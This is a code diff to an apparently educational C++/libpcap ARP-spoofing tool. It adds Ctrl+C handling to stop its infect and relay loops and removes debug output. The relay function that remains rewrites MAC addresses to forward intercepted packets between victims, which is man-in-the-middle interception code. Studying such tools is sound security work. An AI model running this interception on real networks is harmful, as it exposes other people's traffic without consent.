@@ -20,8 +20,10 @@
 #include <arpa/inet.h>
 #include <mutex>
 #include <chrono>
+#include <signal.h>
 
 std::mutex g_mutex_resolveMac;
+bool g_SIGINT_flag = false;
 
 
 #pragma pack(push, 1)
@@ -83,6 +85,12 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);
 
+void SigintHandler(int SIGNUM_){
+	printf("\nSIGINT captured, joining threads...\n");
+	g_SIGINT_flag = true;
+	return;
+}
+
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc % 2 != 0) {
@@ -90,10 +98,17 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	// capture SIGINT=Ctrl+C and call callback function SigintHandler.
+	struct sigaction signalSet;
+	sigemptyset(&(signalSet.sa_mask));
+	signalSet.sa_handler = SigintHandler;
+	signalSet.sa_flags = 0;
+	sigaction(SIGINT, &signalSet, NULL);
+
 	const char* dev = argv[1];
 
 	// get my mac address.
-	Mac MyMac(GetMyMac(argv[1]));
+	Mac MyMac(GetMyMac(dev));
 	if (MyMac.isNull()){
 		fprintf(stderr, "main: GetMyMac error\n");
 		return -1;
@@ -214,7 +229,7 @@ void tResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
 
 	int res = 0;
 	int cnt = 0;
-	while (true)
+	while (!g_SIGINT_flag)
 	{
 		usleep(1000);
 g_mutex_resolveMac.lock();
@@ -272,7 +287,7 @@ void tResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
 	int cnt = 0;
 	int res = 0;
 	struct pcap_pkthdr* header;
-	while (true)
+	while (!g_SIGINT_flag)
 	{
 		usleep(1000);
 g_mutex_resolveMac.lock();
@@ -397,7 +412,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 
 	// stupid method.
 	int res = 0;
-	while (true)
+	while (!g_SIGINT_flag)
 	{
 		usleep(period_);
 		for(int i = 0; i < listSize; i++){
@@ -457,7 +472,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 
 	int res = 0;
 	struct pcap_pkthdr* header;
-	while (true)
+	while (!g_SIGINT_flag)
 	{
 		sleep(0);
 		const u_char* rawRecv;
@@ -482,62 +497,40 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 	
 			// src ip가 sender이고, 내 ip로 보낸 것이 아니라면,
 			if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
-				printf("@tRelayAll: sender -> target\n");
-				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n",
-				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
-				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
-
 				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
 				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+
 				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
 				memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);
 
-				
 g_mutex_resolveMac.lock();
 				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
 g_mutex_resolveMac.unlock();
+
 				if (res != 0) {
 					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 					return;
-				}
-				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n\n\n",
-				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
-				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
-				
+				}				
 				break;
 			}
 	
 			// src mac이 target이고, sender ip에게 보낸 패킷이라면,
 			if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
-			&& pktDstIp == senderIp){
-				// Sender하게 보낸 패킷만 변조해야 함.
-				printf("@tRelayAll: target -> sender\n");
-				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n",
-				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
-				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
-
+			 && pktDstIp == senderIp){
 				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
 				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+
 				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
 				memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
+
 g_mutex_resolveMac.lock();
 				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
 g_mutex_resolveMac.unlock();
+
 				if (res != 0) {
 					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
 					return;
 				}
-				printf("smac=%s\tdmac=%s\nsip=%s\tdip=%s\n\n\n",
-				 std::string(Mac(pktHdr->eEthHdr_.SRC_MAC_ADDR)).c_str(),
-				 std::string(Mac(pktHdr->eEthHdr_.DST_MAC_ADDR)).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR))).c_str(),
-				 std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
 				break;
 			}
 		}
